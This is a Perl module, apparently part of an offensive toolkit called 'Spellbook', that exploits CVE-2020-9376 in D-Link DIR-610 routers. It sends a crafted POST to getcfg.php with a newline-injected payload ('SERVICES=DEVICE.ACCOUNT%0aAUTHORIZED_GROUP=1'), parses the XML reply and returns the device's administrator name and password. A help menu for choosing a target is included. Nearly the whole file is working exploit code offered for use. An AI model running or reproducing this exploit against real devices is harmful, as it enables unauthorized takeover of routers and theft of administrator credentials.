package Spellbook::Advisory::CVE_2020_9376 {
    use strict;
    use warnings;
    use Mojo::DOM;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @results);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//x) {
                $target = "http://$target";
            }

            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $headers   = HTTP::Headers -> new ("Content-Type" => "application/x-www-form-urlencoded");
            my $payload   = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
            my $request   = HTTP::Request -> new("POST", "$target/getcfg.php", $headers, $payload);
            my $response  = $userAgent -> request($request);

            if (($response -> code() == 200) && ($response -> content() =~ m/DIR-610/x)) {
                my $dom = Mojo::DOM -> new($response -> content());

                my $name = $dom -> at("entry > name") -> text();
                my $password = $dom -> at("entry > password") -> text();

                return "$name:$password";
            }

            return @results;
        }

        if ($help) {
            return<<"EOT";

Advisory::CVE_2020_9376
=======================
-h, --help     See this menu
-t, --target   Define a target to exploit\n\n";

EOT
        }

        return 0;
    }
}

1;